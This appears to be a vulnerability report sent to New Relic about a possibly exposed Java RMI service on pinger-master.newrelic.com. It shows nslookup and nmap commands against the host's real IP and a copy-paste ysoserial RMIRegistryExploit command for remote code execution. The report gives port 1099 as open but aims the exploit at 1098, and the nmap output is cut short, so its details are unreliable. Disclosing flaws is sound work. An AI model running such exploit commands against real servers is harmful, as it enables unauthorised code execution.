Summary:

hello Guys 
while i was testing your site i found an interesting domain of newrelic  which is pinger-master.newrelic.com
and when i visit that domain it says unable to connect with the host the i quickly do nslookup and i got this results 
fish@punt ~ $ nslookup pinger-master.newrelic.com
Server:		127.0.1.1
Address:	127.0.1.1#53

Non-authoritative answer:
Name:	pinger-master.newrelic.com
Address: 50.31.164.157

as u see that domain IP is  50.31.164.157 and i decide to scan your  port with nmap then i see that port 1099
is open which is used by Java RMI

fish@punt ~ $ nmap -sV 50.31.164.157

Starting Nmap 6.40 ( http://nmap.org ) at 2016-08-26 08:10 EDT

then i remember that Foxglove security team have Announced that java RMI and other have a common bug that is Remote code Execution which leads your server to critical stage and here is the POC that the foxsec team have realsed 

#POC JAVA RMI
https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/      
u can find about java RMI on  the end of the pages 
#The Exploitation 

the Attacker will download ysoserial  from https://github.com/frohoff/ysoserial/releases
then he can execute what ever commands he wanted on your Server and that is so Critical ISSUE

#POC  

java -cp ysoserial-0.0.1-all.jar ysoserial.RMIRegistryExploit 50.31.164.157 1098 CommonsCollections1 calc.exe

just Downland ysoserial and copy paste that command on port 1098   

Thanks
